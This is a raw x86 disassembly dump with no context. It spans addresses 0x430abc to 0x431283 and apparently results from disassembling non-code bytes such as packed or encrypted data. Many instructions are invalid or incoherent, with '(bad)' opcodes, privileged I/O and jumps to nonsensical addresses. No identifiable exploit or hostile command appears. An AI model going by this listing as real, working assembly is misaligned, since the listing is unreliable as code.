  430abc:	add    BYTE PTR [edi-0xb7474b3],ch
  430ac2:	lock jge 0x430a90
  430ac5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430ac8:	mov    esi,DWORD PTR [edi-0x28]
  430acb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430ad2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430ad8:	mov    edx,ebx
  430ada:	lock (bad) 
  430adc:	ror    esi,cl
  430ade:	push   ebp
  430adf:	scas   eax,DWORD PTR es:[edi]
  430ae0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430ae6:	fwait
  430ae7:	sub    esi,DWORD PTR [edx]
  430ae9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430af0:	xor    esp,DWORD PTR [ebx]
  430af2:	add    ecx,DWORD PTR [ebp-0x18]
  430af5:	mov    edi,DWORD PTR [ebp-0x8]
  430af8:	mov    bl,cl
  430afa:	cmp    dl,bl
  430afc:	jb     0x430acc
  430afe:	add    dh,dl
  430b00:	dec    ebp
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b08:	shr    DWORD PTR [ebx],cl
  430b0a:	into   
  430b0b:	cmp    edx,esi
  430b0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b13:	dec    ebp
  430b14:	dec    ebp
  430b15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b1b:	retf   
  430b1c:	xor    edx,esi
  430b1e:	add    ecx,esi
  430b20:	imul   ecx,edx
  430b23:	mov    DWORD PTR [ebp+0x8],edx
  430b26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430b29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430b2f:	add    esi,DWORD PTR [ebx]
  430b31:	rol    BYTE PTR [ebx],0x45
  430b34:	rdtsc  
  430b36:	xlat   BYTE PTR ds:[ebx]
  430b37:	pushf  
  430b38:	jge    0x430ac3
  430b3a:	xor    ebx,eax
  430b3c:	sub    eax,DWORD PTR [ebp-0x73]
  430b3f:	(bad)  
  430b40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430b47:	dec    ebp
  430b48:	xchg   BYTE PTR [ebx],dh
  430b4a:	inc    DWORD PTR [ebx]
  430b4c:	(bad)  
  430b4d:	jmp    0x430b9c
  430b4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430b55:	dec    ebp
  430b56:	into   
  430b57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430b5d:	fwait
  430b5e:	shl    DWORD PTR [edx],cl
  430b60:	retf   0x5588
  430b63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430b69:	add    eax,DWORD PTR [eax]
  430b6b:	call   0x8ace60bd
  430b70:	fcom   QWORD PTR [ecx]
  430b72:	retf   
  430b73:	jb     0x430bda
  430b75:	add    ch,cl
  430b77:	dec    ebp
  430b78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430b7e:	dec    ebp
  430b7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b85:	jge    0x430b55
  430b87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b8d:	add    cl,dh
  430b8f:	dec    ebp
  430b90:	dec    DWORD PTR [ebx-0x2c031b01]
  430b96:	inc    ebp
  430b97:	push   ebp
  430b98:	dec    DWORD PTR [ebx-0x73ff2734]
  430b9e:	lea    ebx,[ebx-0x7400cdac]
  430ba4:	push   eax
  430ba5:	mov    ah,0x45
  430ba7:	push   ebp
  430ba8:	mov    esi,DWORD PTR [ebx]
  430baa:	les    esi,FWORD PTR [ebx]
  430bac:	add    BYTE PTR [ebx],al
  430bae:	inc    DWORD PTR [ebx]
  430bb0:	mov    ecx,DWORD PTR [edi]
  430bb2:	cld    
  430bb3:	retf   0x4d80
  430bb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430bbc:	jne    0x430b49
  430bbe:	jmp    eax
  430bc0:	ror    bl,1
  430bc2:	or     cl,dh
  430bc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430bca:	not    bl
  430bcc:	adc    al,0xca
  430bce:	inc    ebp
  430bcf:	push   ebp
  430bd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430bd6:	push   0xaf80d6
  430bdb:	mov    eax,DWORD PTR [eax]
  430bdd:	in     al,0xff
  430bdf:	sti    
  430be0:	sbb    dh,cl
  430be2:	pop    esi
  430be3:	xchg   esp,eax
  430be4:	leave  
  430be5:	fwait
  430be6:	add    al,0x32
  430be8:	push   ebp
  430be9:	cmp    ebp,esp
  430beb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430bef:	dec    DWORD PTR [ecx-0x740f0375]
  430bf5:	push   ebp
  430bf6:	cld    
  430bf7:	xor    ebp,ebx
  430bf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430bff:	push   ebp
  430c00:	clc    
  430c01:	xor    esi,ecx
  430c03:	add    esi,DWORD PTR [ebp-0x75]
  430c06:	(bad)  
  430c07:	hlt    
  430c08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c0f:	mov    DWORD PTR [esi],eax
  430c11:	hlt    
  430c12:	(bad)  
  430c13:	dec    ebp
  430c14:	add    esi,DWORD PTR [ebx]
  430c16:	(bad)  
  430c17:	mov    edx,0xffc68d0a
  430c1c:	add    dl,cl
  430c1e:	leave  
  430c1f:	push   ebp
  430c20:	push   ebp
  430c21:	mov    ebp,esp
  430c23:	fcom   QWORD PTR [ecx+0x7d]
  430c26:	inc    ebp
  430c27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430c2d:	iret   
  430c2e:	cld    
  430c2f:	retf   0x868f
  430c32:	loopne 0x430c31
  430c34:	mov    edi,edi
  430c36:	mov    esi,DWORD PTR [ebp-0x8]
  430c39:	mov    esi,eax
  430c3b:	cld    
  430c3c:	jne    0x430bee
  430c3e:	mov    BYTE PTR [ecx],0xa
  430c41:	add    dh,al
  430c43:	test   DWORD PTR [eax],ecx
  430c45:	inc    esi
  430c47:	inc    DWORD PTR [edi]
  430c49:	mov    eax,esi
  430c4b:	cld    
  430c4c:	add    DWORD PTR [eax+0x901c6],eax
  430c52:	leave  
  430c53:	xor    BYTE PTR [ebp+0x45],dl
  430c56:	in     al,dx
  430c57:	mov    edx,DWORD PTR [ecx-0x40]
  430c5a:	inc    ebp
  430c5b:	add    BYTE PTR [ecx-0x74000301],cl
  430c61:	int3   
  430c62:	cld    
  430c63:	jne    0x430c1d
  430c65:	call   0xcc1f70
  430c6a:	mov    esi,DWORD PTR [ebp-0x8]
  430c6d:	test   eax,esi
  430c6f:	je     0x430ce6
  430c71:	mov    eax,esi
  430c73:	cld    
  430c74:	add    al,0x80
  430c76:	add    WORD PTR [ecx+0x0],ax
  430c7a:	fiadd  DWORD PTR [eax]
  430c7c:	mov    BYTE PTR [eax],0x3d
  430c7f:	push   0xffffffc3
  430c81:	push   esi
  430c82:	mov    edx,DWORD PTR [eax+0x51]
  430c85:	pop    edi
  430c86:	lea    ebx,[ebx-0x8]
  430c89:	ret    0x45
  430c8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c92:	xchg   eax,edi
  430c94:	mov    DWORD PTR [ebp-0x75],ecx
  430c97:	push   esi
  430c98:	clc    
  430c99:	jne    0x430c6b
  430c9b:	mov    ecx,0xf8450b0b
  430ca0:	(bad)  
  430ca1:	push   cs
  430ca2:	or     BYTE PTR [ebp-0x3a],dh
  430ca5:	cmp    eax,DWORD PTR [ecx]
  430ca7:	pop    esi
  430ca8:	(bad)  
  430ca9:	or     al,0x5
  430cab:	inc    eax
  430cac:	leave  
  430cad:	jmp    0x40cf:0x25564204
  430cb4:	leave  
  430cb5:	in     eax,dx
  430cb6:	inc    DWORD PTR [eax-0x75]
  430cb9:	fimul  DWORD PTR [ebx-0x228139be]
  430cbf:	inc    eax
  430cc0:	nop
  430cc1:	loopne 0x430cc2
  430cc3:	ret    
  430cc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430cca:	add    eax,0xff45e8f8
  430ccf:	push   esi
  430cd0:	push   DWORD PTR [ebp-0x39]
  430cd3:	mov    eax,0x7edda46
  430cd8:	or     al,0x6
  430cda:	push   DWORD PTR [ebp-0x3a]
  430cdd:	cmp    eax,DWORD PTR [edx]
  430cdf:	pop    esi
  430ce0:	ret    
  430ce1:	or     al,0x56
  430ce3:	inc    ecx
  430ce4:	push   ebp
  430ce5:	jle    0x430cd3
  430ce7:	inc    edx
  430ce8:	inc    ebp
  430ce9:	int    0x1
  430ceb:	inc    ecx
  430cec:	sub    BYTE PTR ds:0xe77541fc,ah
  430cf2:	add    DWORD PTR [edx+0x1c],eax
  430cf5:	retf   0xc38b
  430cf8:	adc    al,0x8b
  430cfa:	xchg   edx,eax
  430cfb:	push   ecx
  430cfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d02:	rcl    DWORD PTR [esi-0x9],cl
  430d05:	jne    0x430d57
  430d07:	mov    eax,0x7c80ece
  430d0c:	rol    DWORD PTR [esi],cl
  430d0e:	div    DWORD PTR [ebp+0x50]
  430d11:	cmp    ecx,edx
  430d13:	pop    esi
  430d14:	dec    BYTE PTR [edx]
  430d16:	in     al,dx
  430d17:	inc    edx
  430d18:	sub    esp,ecx
  430d1a:	inc    eax
  430d1b:	(bad)  
  430d1c:	push   eax
  430d1d:	add    edx,DWORD PTR [eax-0x1f]
  430d20:	push   edi
  430d21:	add    dh,dh
  430d23:	leave  
  430d24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430d28:	add    BYTE PTR [ecx+0x0],dl
  430d2b:	inc    ebp
  430d2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d32:	add    BYTE PTR [eax-0x7fbf448],bh
  430d38:	add    al,0x2
  430d3a:	jmp    0x57eb894
  430d3f:	jne    0x430d29
  430d41:	mov    eax,DWORD PTR [edx]
  430d43:	or     BYTE PTR [eax],al
  430d45:	inc    ecx
  430d46:	stc    
  430d47:	in     eax,dx
  430d48:	ss inc eax
  430d4a:	aas    
  430d4b:	out    0x7d,eax
  430d4d:	inc    ecx
  430d4e:	mov    ebp,ecx
  430d50:	lock ret 0x7d
  430d54:	and    ecx,DWORD PTR [ebx-0x171777]
  430d5a:	add    bh,bh
  430d5c:	aad    0xd7
  430d5e:	add    dh,cl
  430d60:	clts   
  430d62:	(bad)  
  430d63:	call   0xffce0c68
  430d68:	hlt    
  430d69:	iret   
  430d6a:	jge    0x430d42
  430d6c:	rol    DWORD PTR [esi-0x80],cl
  430d6f:	jmp    0x1c5c7c
  430d74:	out    dx,al
  430d75:	mov    eax,DWORD PTR [ebx]
  430d77:	(bad)  
  430d78:	pop    esi
  430d79:	push   es
  430d7a:	cmp    al,0xe8
  430d7c:	sar    edi,0x8
  430d7f:	inc    DWORD PTR [edi]
  430d81:	inc    esi
  430d82:	(bad)  
  430d83:	loopne 0x430e03
  430d85:	push   edi
  430d86:	push   cs
  430d87:	push   ebx
  430d88:	add    BYTE PTR [ebx+0x24008b56],cl
  430d8e:	add    BYTE PTR [ebp+0x50],al
  430d91:	push   eax
  430d92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d98:	sub    edx,DWORD PTR [esi-0x24]
  430d9b:	jne    0x430d53
  430d9d:	lods   eax,DWORD PTR ds:[esi]
  430d9e:	mov    edx,DWORD PTR [edx-0x34]
  430da1:	dec    esi
  430da2:	out    0x83,eax
  430da4:	into   
  430da5:	push   edi
  430da7:	loopne 0x430d77
  430da9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430dad:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430db4:	rol    DWORD PTR [edx],0x8
  430db7:	mov    esp,ecx
  430db9:	cmp    DWORD PTR [ebx],0xc
  430dbc:	mov    esi,0x5001c0
  430dc1:	push   eax
  430dc2:	push   cs
  430dc3:	push   eax
  430dc4:	(bad)  
  430dc5:	sub    edx,edi
  430dc7:	push   esi
  430dc8:	adc    al,0xcb
  430dca:	ins    DWORD PTR es:[edi],dx
  430dcb:	mov    eax,0x203e8
  430dd0:	add    al,ah
  430dd2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430dd9:	add    dh,al
  430ddb:	add    ah,ch
  430ddd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430de3:	pop    ecx
  430de4:	or     eax,ebx
  430de6:	cli    
  430de7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430ded:	lea    ebp,[ebx]
  430def:	mov    edx,DWORD PTR [edx-0x4]
  430df2:	dec    ecx
  430df3:	inc    ebp
  430df4:	shr    BYTE PTR [ebx],0x4b
  430df7:	and    al,0x0
  430df9:	(bad)  
  430dfa:	jne    0x430e41
  430dfc:	pop    eax
  430dfd:	mov    al,0x5a
  430dff:	call   0x142105e
  430e04:	and    al,0x85
  430e06:	push   edx
  430e07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e0b:	dec    ebp
  430e0c:	mov    cl,0x23
  430e0e:	jmp    0x430dfc
  430e10:	mov    al,0xe7
  430e12:	call   0x1391100
  430e17:	shr    DWORD PTR [eax+ebx*2],cl
  430e1a:	lock (bad) 
  430e1c:	adc    eax,0x757f008d
  430e21:	out    0x58,eax
  430e23:	cmp    al,0x7
  430e25:	pop    edx
  430e26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430e2d:	push   ecx
  430e2e:	cld    
  430e2f:	mov    esi,0x3b0175
  430e34:	and    al,0xb0
  430e36:	xor    BYTE PTR [edx+0x1],0x8b
  430e3a:	add    ah,bh
  430e3c:	mov    edi,DWORD PTR [ebp-0x4]
  430e3f:	psubsw mm7,QWORD PTR [edi]
  430e42:	add    DWORD PTR [ebp+0x0],ebp
  430e45:	rcr    eax,1
  430e47:	mov    edi,ecx
  430e49:	and    eax,DWORD PTR [eax]
  430e4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e51:	call   0x130113a
  430e56:	add    al,cl
  430e58:	mov    ebp,esi
  430e5a:	aam    0x83
  430e5c:	or     DWORD PTR [ecx],eax
  430e5e:	jne    0x430e51
  430e60:	mov    eax,DWORD PTR [eax]
  430e62:	aam    0x0
  430e64:	dec    ebp
  430e65:	jne    0x430df2
  430e67:	cmp    ebx,eax
  430e69:	jb     0x430eb8
  430e6b:	jmp    0x430df8
  430e6d:	mov    ebx,esp
  430e6f:	int3   
  430e70:	dec    ebp
  430e71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e78:	mov    edx,0x8b0a8b
  430e7d:	cmp    ecx,DWORD PTR [eax]
  430e7f:	jb     0x430e58
  430e81:	pop    edx
  430e82:	push   edi
  430e83:	cli    
  430e84:	pop    es
  430e85:	mov    eax,ecx
  430e87:	jb     0x430e8b
  430e89:	add    DWORD PTR [ebx],0xa
  430e8c:	mov    eax,DWORD PTR [ebx]
  430e8e:	int3   
  430e8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e95:	jmp    0x430e22
  430e97:	mov    al,0xe8
  430e99:	call   0x104111b
  430e9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430ea1:	pop    edi
  430ea2:	or     BYTE PTR [ecx-0x73],bl
  430ea5:	pop    ecx
  430ea6:	inc    edi
  430ea7:	xor    al,0xeb
  430ea9:	push   ecx
  430eaa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430eb0:	call   0xb20fb5
  430eb5:	int3   
  430eb6:	sbb    BYTE PTR [esi],ch
  430eb8:	inc    ebp
  430eb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430ebf:	call   0x9c112e
  430ec4:	or     BYTE PTR [ebx-0x73],dl
  430ec7:	cmp    al,0x47
  430ec9:	mov    al,0x1
  430ecb:	jb     0x430ecd
  430ecd:	mov    al,0x10
  430ecf:	push   eax
  430ed0:	add    al,0x75
  430ed2:	add    BYTE PTR [ebx],ch
  430ed4:	add    ebx,esp
  430ed6:	int3   
  430ed7:	jne    0x430ee9
  430ed9:	movsx  edx,cl
  430edc:	add    DWORD PTR [eax],eax
  430ede:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430ee5:	mov    gs,edi
  430ee7:	add    BYTE PTR [eax-0x50],ch
  430eea:	add    al,ch
  430eec:	mov    eax,DWORD PTR [ecx]
  430eee:	sub    eax,DWORD PTR [eax]
  430ef0:	jb     0x430f67
  430ef2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ef6:	jge    0x430ee0
  430ef8:	add    al,0x1
  430efa:	add    DWORD PTR [eax],0x0
  430efd:	jne    0x430eff
  430eff:	je     0x430f46
  430f01:	mov    eax,DWORD PTR [edi]
  430f03:	ror    BYTE PTR [ebp+0x4d],1
  430f06:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f0d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f13:	mov    DWORD PTR [ebx],ebp
  430f15:	fadd   DWORD PTR [eax+0x75]
  430f18:	inc    eax
  430f19:	pop    eax
  430f1a:	lea    ebx,[ecx+0x4f]
  430f1d:	push   0xb1000003
  430f22:	out    dx,eax
  430f23:	add    ebp,DWORD PTR [edx+edx*2]
  430f26:	add    BYTE PTR [ebx+ecx*4],bh
  430f29:	mov    ch,BYTE PTR [ebx]
  430f2b:	jb     0x430f9f
  430f2d:	add    al,0x89
  430f2f:	push   eax
  430f30:	call   0x842b5ca2
  430f35:	add    DWORD PTR [eax+eax*1],eax
  430f38:	jae    0x430f4e
  430f3a:	icebp  
  430f3b:	inc    ebp
  430f3c:	mov    eax,DWORD PTR gs:[ecx]
  430f3f:	int3   
  430f40:	out    dx,al
  430f41:	loopne 0x430f90
  430f43:	sub    eax,DWORD PTR [edx]
  430f45:	push   0xffffff83
  430f47:	pop    esi
  430f48:	push   cs
  430f49:	jl     0x430f64
  430f4b:	add    al,0xaf
  430f4d:	xor    eax,0x832b6d00
  430f52:	mov    eax,DWORD PTR [edx]
  430f54:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f5a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f60:	inc    ebp
  430f61:	shr    ebx,0x3
  430f64:	or     DWORD PTR [eax],0x4
  430f67:	push   0xffffffa5
  430f69:	pop    esi
  430f6a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f71:	jmp    0x430fd0
  430f73:	mov    edi,0xff0272
  430f78:	fdivr  QWORD PTR [ebp+0x5d]
  430f7b:	push   0x4e
  430f7d:	pop    ecx
  430f7e:	call   0x435383
  430f83:	mov    DWORD PTR [ebx],eax
  430f85:	in     al,0xc8
  430f87:	rol    BYTE PTR [ebp-0x75],0xc1
  430f8b:	call   0xad116c
  430f90:	pop    esi
  430f91:	enter  0xceff,0x8b
  430f95:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f99:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430fa0:	je     0x430fa2
  430fa2:	or     DWORD PTR [ebx-0x74183b24],eax
  430fa8:	jne    0x430f8e
  430faa:	jmp    0x430fa5
  430fac:	push   DWORD PTR [edx-0x24]
  430faf:	push   0x4d
  430fb1:	pop    ecx
  430fb2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430fb6:	jge    0x430fbe
  430fb8:	mov    eax,eax
  430fba:	sub    ebp,DWORD PTR [edx+0x24]
  430fbd:	pop    esi
  430fbe:	inc    ebp
  430fbf:	mov    esp,0x8b6077
  430fc4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430fca:	lods   al,BYTE PTR ds:[esi]
  430fcb:	add    BYTE PTR [ebx],bh
  430fcd:	enter  0xce73,0x49
  430fd1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fd9:	stc    
  430fda:	jge    0x43104e
  430fdc:	jnp    0xdd42934b
  430fe2:	call   0xc610b8
  430fe7:	fadd   st(0),st
  430fe9:	dec    esi
  430fea:	ins    BYTE PTR es:[edi],dx
  430feb:	stc    
  430fec:	cmp    al,0x73
  430fee:	push   ebp
  430fef:	mov    eax,0xf8028b
  430ff4:	jne    0x430fb7
  430ff6:	mov    esi,ecx
  430ff8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ffb:	add    edi,DWORD PTR [ebp-0x24]
  430ffe:	sub    esp,eax
  431000:	and    al,0x45
  431002:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431008:	sbb    al,0xee
  43100a:	pop    esi
  43100b:	call   0x83103b
  431010:	fsubr  st,st(3)
  431012:	sti    
  431013:	add    BYTE PTR gs:[ecx],bh
  431016:	add    eax,esp
  431018:	add    DWORD PTR [esi],eax
  43101a:	rol    DWORD PTR [ebp+0x8],0x29
  43101e:	mov    esp,eax
  431020:	clc    
  431021:	jne    0x431098
  431023:	mov    eax,0x8b0673
  431028:	loopne 0x43106f
  43102a:	loopne 0x430fb5
  43102c:	lods   al,BYTE PTR ds:[esi]
  43102d:	int3   
  43102e:	inc    ebp
  43102f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431033:	add    al,0xc3
  431035:	sub    ecx,DWORD PTR [ebp+0x47]
  431038:	(bad)  
  43103a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43103e:	add    eax,DWORD PTR [eax]
  431040:	call   0x644d145
  431045:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43104b:	dec    esi
  43104c:	ins    DWORD PTR es:[edi],dx
  43104d:	in     al,dx
  43104e:	lea    eax,[eax]
  431050:	inc    ebp
  431051:	inc    ebp
  431052:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431058:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431062:	and    al,0xdc
  431064:	ror    DWORD PTR [edx+0x24],0xf7
  431068:	or     BYTE PTR [ebp+0x4c],dh
  43106b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43106f:	stos   BYTE PTR es:[edi],al
  431070:	adc    edx,edi
  431072:	inc    esp
  431073:	add    edi,DWORD PTR [eax]
  431075:	jne    0x43105a
  431077:	mov    DWORD PTR [eax-0x7449db04],ecx
  43107d:	cmp    ecx,DWORD PTR [edi]
  43107f:	sub    BYTE PTR [ebp-0x7e],dl
  431082:	sar    ebp,0xb
  431085:	jmp    FWORD PTR [edi+0x2400392a]
  43108b:	sub    esi,DWORD PTR [ebx-0x73]
  43108e:	mov    esp,DWORD PTR [ecx+edi*4]
  431091:	mov    ecx,DWORD PTR [eax]
  431093:	and    BYTE PTR [eax],al
  431095:	jne    0x431061
  431097:	sub    ebp,ecx
  431099:	sbb    BYTE PTR [esi+0x32],ah
  43109c:	dec    ebp
  43109d:	push   ebp
  43109e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4310a4:	ret    
  4310a5:	mov    edx,ebp
  4310a7:	leave  
  4310a8:	sub    DWORD PTR [esi+0x24],ebx
  4310ab:	ret    0x2b
  4310ae:	pop    ax
  4310b0:	push   ebp
  4310b1:	rol    BYTE PTR [ebx],0xeb
  4310b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4310bb:	jb     0x431112
  4310bd:	ret    
  4310be:	in     al,dx
  4310bf:	jecxz  0x43104c
  4310c1:	push   esi
  4310c2:	xchg   esp,eax
  4310c3:	jne    0x4310c5
  4310c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4310c8:	jne    0x4310ae
  4310ca:	mov    eax,DWORD PTR [ebp-0x77]
  4310cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310d4:	mov    esi,DWORD PTR [ebp-0x75]
  4310d7:	pop    esi
  4310d8:	nop
  4310d9:	mov    eax,DWORD PTR [eax]
  4310db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310e1:	add    al,0x0
  4310e3:	inc    ebp
  4310e4:	mov    eax,DWORD PTR [ebx]
  4310e6:	mov    ebp,ebx
  4310e8:	cmp    al,0xf
  4310ea:	or     al,al
  4310ec:	inc    ebp
  4310ed:	inc    ebp
  4310ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4310f4:	cld    
  4310f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4310fb:	add    BYTE PTR [ecx-0x5],dl
  4310fe:	add    eax,0x17200
  431103:	sbb    al,0x85
  431105:	dec    esp
  431106:	je     0x431140
  431108:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43110c:	add    BYTE PTR [ebx],bh
  43110e:	(bad)  
  43110f:	and    al,0x32
  431111:	jae    0x4310af
  431113:	mov    cl,cl
  431115:	inc    DWORD PTR [esp]
  431118:	push   ebp
  431119:	shr    esp,0x8
  43111c:	in     al,dx
  43111d:	push   esp
  43111e:	add    DWORD PTR [eax],esp
  431120:	add    bl,cl
  431122:	inc    ebp
  431123:	mov    bh,0x89
  431125:	add    ah,bh
  431127:	jmp    0xca752071
  43112c:	pushf  
  43112d:	dec    esp
  43112e:	mov    edx,0xf8178520
  431133:	fst    DWORD PTR [ebp+0x0]
  431136:	mov    BYTE PTR [eax],0xc4
  431139:	sub    edx,DWORD PTR [ebx-0x3f]
  43113c:	inc    ebp
  43113d:	add    eax,0xc601da
  431142:	mov    al,0xc6
  431145:	ins    BYTE PTR es:[edi],dx
  431146:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43114d:	dec    esp
  43114e:	jmp    DWORD PTR [eax]
  431150:	inc    ebp
  431151:	fnstcw WORD PTR [esi+0x29]
  431154:	test   BYTE PTR [eax],0xc8
  431157:	rol    BYTE PTR [eax],0xc0
  43115a:	lea    ecx,[ebp-0x3cf0dbcb]
  431160:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431166:	inc    esi
  431167:	add    DWORD PTR [eax],ebx
  431169:	add    dh,bh
  43116b:	mov    esi,DWORD PTR [edx+0x8]
  43116e:	(bad)  
  43116f:	fdiv   QWORD PTR ss:[ecx]
  431172:	(bad)  
  431173:	mov    bl,ch
  431175:	add    esi,eax
  431177:	add    dh,bl
  431179:	or     esi,eax
  43117b:	mov    dl,0xdf
  43117d:	add    esi,eax
  43117f:	add    al,ah
  431181:	push   cs
  431182:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431189:	or     BYTE PTR [ebx],dh
  43118b:	dec    ecx
  43118c:	lea    eax,[ebx]
  43118e:	xor    eax,0x18fc0fc7
  431193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431194:	repz clc 
  431196:	add    eax,DWORD PTR [ebp+0x46]
  431199:	prefetcht0 BYTE PTR [ecx-0x2]
  43119d:	xor    eax,0x7c60872
  4311a2:	mov    esp,0xbd32c69b
  4311a7:	pop    esi
  4311a8:	mov    cl,0xbe
  4311ab:	or     al,0xc6
  4311ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4311b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4311bb:	add    dh,al
  4311bd:	mov    eax,ebx
  4311bf:	xor    DWORD PTR [ebx],0x35008dbc
  4311c5:	mov    ecx,DWORD PTR [edi]
  4311c7:	sbb    al,0x18
  4311c9:	inc    ebp
  4311ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4311d1:	clc    
  4311d2:	(bad)  
  4311d3:	xor    DWORD PTR [edx-0x64],esi
  4311d6:	lea    ecx,[ecx+0x45ffe838]
  4311dc:	mov    ecx,ebx
  4311de:	fadd   st,st(6)
  4311e0:	dec    ebp
  4311e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4311e7:	out    0x1,eax
  4311e9:	inc    ebp
  4311ea:	lea    ebp,ds:0xc8ffc6ff
  4311f0:	enter  0xa33,0xc6
  4311f4:	push   ebp
  4311f5:	leave  
  4311f6:	(bad)  
  4311f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4311fd:	add    BYTE PTR [ebp+0x44],al
  431200:	mov    eax,esp
  431202:	mov    WORD PTR [esi+0x46398300],?
  431208:	psubusw mm4,QWORD PTR [esi-0x78]
  43120c:	add    BYTE PTR [ebx-0x1303f975],al
  431212:	add    BYTE PTR [ebp+0x1],0xeb
  431216:	add    BYTE PTR [ebp+0x38],al
  431219:	in     eax,dx
  43121a:	inc    ebp
  43121b:	inc    ebp
  43121c:	mov    ebx,ebx
  43121e:	add    BYTE PTR [ebp+0x0],0xec
  431222:	mov    DWORD PTR [ebp-0x41],eax
  431225:	sub    eax,0x2c00454e
  43122a:	ins    DWORD PTR es:[edi],dx
  43122b:	inc    ebp
  43122c:	add    BYTE PTR [esi+0x66],bh
  43122f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431236:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431240:	dec    edi
  431241:	pop    es
  431242:	add    ah,ch
  431244:	mov    DWORD PTR [ebp+0x68],eax
  431247:	in     eax,dx
  431248:	inc    DWORD PTR [ebp-0x7d]
  43124b:	out    0xc0,al
  43124d:	inc    ebp
  43124e:	mov    edx,esp
  431250:	push   0x45
  431252:	(bad)  
  431253:	jmp    0xdf925810
  431258:	add    BYTE PTR [ebp-0x77],al
  43125b:	out    dx,al
  43125c:	ins    BYTE PTR es:[edi],dx
  43125d:	inc    ebp
  43125e:	jmp    edi
  431260:	add    DWORD PTR [ebp-0x14],0x7e
  431264:	mov    esi,esi
  431266:	outs   dx,BYTE PTR ds:[esi]
  431267:	inc    esp
  431268:	(bad)  
  431269:	mov    esp,0x8341b68d
  43126e:	mov    DWORD PTR [esi+0x70],eax
  431271:	fcos   
  431273:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431279:	in     al,dx
  43127a:	jb     0x431201
  43127c:	(bad)  
  43127d:	dec    DWORD PTR [ebx-0x7aba9901]
  431283:	mov    edi,edi
